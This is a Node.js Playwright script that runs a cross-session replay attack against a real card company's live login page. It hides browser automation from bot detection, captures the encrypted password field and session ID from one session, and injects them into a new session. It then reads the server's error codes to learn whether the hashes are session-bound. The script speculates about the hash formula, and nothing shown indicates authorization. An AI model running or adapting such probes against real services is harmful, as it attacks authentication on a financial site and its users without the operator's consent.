/**
 * Test: Cross-Session Replay Attack
 *
 * Goal: See if valid hash from one session works in another session
 *
 * This reveals:
 * - Are hashes session-bound?
 * - Can we replay captured hashes?
 * - What error do we get (session mismatch vs wrong password)?
 *
 * Method:
 * 1. Session 1: Type "test" → Capture pwd__E2E__ and session ID
 * 2. Reload (Session 2 with different session ID)
 * 3. Inject Session 1's hash
 * 4. Submit and compare error
 */

const { chromium } = require('playwright-core');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function waitForEnter(message) {
  return new Promise((resolve) => {
    rl.question(`\n${message}\nPress ENTER to continue...`, () => {
      resolve();
    });
  });
}

(async () => {
  console.log('🔬 Cross-Session Replay Attack Test\n');
  console.log('═'.repeat(70));
  console.log('Goal: Test if valid hash can be replayed in different session');
  console.log('═'.repeat(70));
  console.log('');

  const testData = {
    session1: null,
    session2: null,
    response1: null,
    response2: null
  };

  const browser = await chromium.launch({
    channel: 'chrome',
    headless: false,
    args: ['--disable-blink-features=AutomationControlled']
  });

  const context = await browser.newContext({ locale: 'ko-KR' });
  const page = await context.newPage();

  // Capture responses
  let responseCapture = null;

  page.on('response', async response => {
    const url = response.url();

    if (url.includes('CMMServiceMemLoginC.ajax') && response.request().method() === 'POST') {
      try {
        const responseText = await response.text();
        responseCapture = {
          status: response.status(),
          body: responseText
        };

        console.log(`\n📥 Login response:`);
        console.log(`   Status: ${response.status()}`);

        try {
          const json = JSON.parse(responseText);
          console.log(`   Result: ${json.crp_result}`);
          console.log(`   Code: ${json.crp_code || '(none)'}`);
          console.log(`   Message: ${json.crp_message || '(none)'}`);
        } catch (e) {
          console.log(`   Body: ${responseText.substring(0, 100)}`);
        }

        console.log('');
      } catch (e) {
        console.log(`   (Could not read response)`);
      }
    }
  });

  // ========== SESSION 1 ==========
  console.log('═'.repeat(70));
  console.log('SESSION 1: Capture valid hash');
  console.log('═'.repeat(70));
  console.log('');

  console.log('🌐 Loading page...');
  await page.goto('https://www.shinhancard.com/cconts/html/main.html');
  await page.waitForTimeout(3000);

  const session1ID = await page.evaluate(() => {
    return document.querySelector('input[name="__E2E_UNIQUE__"]')?.value || '';
  });

  console.log(`Session 1 ID: ${session1ID}`);
  console.log('');

  console.log('Instructions:');
  console.log('  1. Enter ID: testuser');
  console.log('  2. Type password with HARDWARE KEYBOARD: test');
  console.log('  3. Press ENTER here');
  console.log('');

  await waitForEnter('Press ENTER after typing password');

  const validData = await page.evaluate(() => {
    return {
      visible: document.getElementById('pwd')?.value || '',
      pwd__E2E__: document.querySelector('input[name="pwd__E2E__"]')?.value || '',
      sessionID: document.querySelector('input[name="__E2E_UNIQUE__"]')?.value || ''
    };
  });

  console.log(`Captured from Session 1:`);
  console.log(`  Visible: "${validData.visible}"`);
  console.log(`  pwd__E2E__ length: ${validData.pwd__E2E__.length} chars`);
  console.log(`  Session ID: ${validData.sessionID}`);
  console.log('');

  testData.session1 = {
    sessionID: validData.sessionID,
    visible: validData.visible,
    pwd__E2E__: validData.pwd__E2E__
  };

  // ========== SESSION 2 ==========
  console.log('═'.repeat(70));
  console.log('SESSION 2: Replay attack with old hash');
  console.log('═'.repeat(70));
  console.log('');

  await waitForEnter('Press ENTER to reload page (new session)');

  console.log('🔄 Reloading page (new session)...');
  await page.goto('https://www.shinhancard.com/cconts/html/main.html');
  await page.waitForTimeout(3000);

  const session2ID = await page.evaluate(() => {
    return document.querySelector('input[name="__E2E_UNIQUE__"]')?.value || '';
  });

  console.log(`Session 2 ID: ${session2ID}`);
  console.log('');

  if (session2ID === session1ID) {
    console.log('⚠️  WARNING: Session IDs are the same!');
    console.log('   This might not be a new session');
    console.log('');
  } else {
    console.log('✅ Different session ID (new session confirmed)');
    console.log('');
  }

  testData.session2 = {
    sessionID: session2ID
  };

  console.log('Injecting Session 1 hash into Session 2...');
  console.log('');

  await page.evaluate(({ oldHash, visiblePwd }) => {
    // Fill username
    document.getElementById('memid').value = 'testuser';

    // Set visible password (from session 1)
    document.getElementById('pwd').value = visiblePwd;

    // Set hidden hash (from session 1)
    document.querySelector('input[name="pwd__E2E__"]').value = oldHash;
  }, { oldHash: testData.session1.pwd__E2E__, visiblePwd: testData.session1.visible });

  console.log('✅ Injected Session 1 data:');
  console.log(`   Visible: "${testData.session1.visible}"`);
  console.log(`   Hash from session: ${testData.session1.sessionID.substring(0, 15)}`);
  console.log(`   Current session: ${session2ID.substring(0, 15)}`);
  console.log('');

  responseCapture = null;  // Reset

  console.log('═'.repeat(70));
  console.log('SUBMIT: Click login with replayed hash');
  console.log('═'.repeat(70));
  console.log('');
  console.log('Click the LOGIN button now!');
  console.log('');

  await waitForEnter('Press ENTER after clicking login');

  await page.waitForTimeout(2000);

  testData.response2 = responseCapture;

  // Analysis
  console.log('');
  console.log('═'.repeat(70));
  console.log('📊 ANALYSIS');
  console.log('═'.repeat(70));
  console.log('');

  if (responseCapture) {
    console.log('Server response to cross-session replay:');
    console.log('');

    try {
      const json = JSON.parse(responseCapture.body);

      console.log(`  Result: ${json.crp_result}`);
      console.log(`  Code: ${json.crp_code || '(none)'}`);
      console.log(`  Message: ${json.crp_message || '(none)'}`);
      console.log('');

      const errorCode = json.crp_code || '';
      const errorMsg = json.crp_message || '';

      // Analyze error type
      if (errorCode.includes('uvpe_2702') || errorMsg.includes('입력오류')) {
        console.log('💡 Same error as garbled hash test!');
        console.log('   Error: "Password input error"');
        console.log('');
        console.log('This means:');
        console.log('  ✅ Hashes are SESSION-BOUND');
        console.log('  ✅ Server validates hash belongs to current session');
        console.log('  ✅ Cannot replay hashes from other sessions');
        console.log('  ✅ Hash likely includes session ID in its generation');
        console.log('');
      } else if (errorMsg.includes('존재') || errorMsg.includes('정보')) {
        console.log('💡 Different error: "Invalid credentials" / "User not found"');
        console.log('');
        console.log('This means:');
        console.log('  ✅ Server accepted the hash format');
        console.log('  ✅ Server decrypted successfully');
        console.log('  ✅ But password didn\'t match');
        console.log('  ⚠️  Hashes might NOT be session-bound?');
        console.log('');
      } else {
        console.log('💡 Unknown error type');
        console.log(`   Code: ${errorCode}`);
        console.log(`   Message: ${errorMsg}`);
        console.log('');
      }

    } catch (e) {
      console.log('Response (not JSON):');
      console.log(`  ${responseCapture.body}`);
      console.log('');
    }
  } else {
    console.log('⚠️  No response captured');
  }

  console.log('═'.repeat(70));
  console.log('🎯 CONCLUSION');
  console.log('═'.repeat(70));
  console.log('');

  console.log('Test results:');
  console.log(`  Session 1 ID: ${testData.session1.sessionID}`);
  console.log(`  Session 2 ID: ${testData.session2.sessionID}`);
  console.log(`  Different sessions: ${testData.session1.sessionID !== testData.session2.sessionID ? '✅ YES' : '❌ NO'}`);
  console.log('');

  if (testData.response2) {
    try {
      const json = JSON.parse(testData.response2.body);
      console.log(`  Server response: ${json.crp_result} (${json.crp_code})`);

      if (json.crp_code?.includes('uvpe_2702')) {
        console.log('');
        console.log('VERDICT: Hashes are session-bound');
        console.log('  - Cannot replay across sessions');
        console.log('  - Hash generation includes session ID');
        console.log('  - Formula likely: SHA256(sessionID + char + position)');
      }
    } catch (e) {}
  }

  console.log('');

  // Save results
  fs.writeFileSync('cross-session-replay-test.json', JSON.stringify(testData, null, 2));
  console.log('💾 Saved to: cross-session-replay-test.json');
  console.log('');

  await waitForEnter('Press ENTER to close browser');

  await browser.close();
  rl.close();

  process.exit(0);
})();
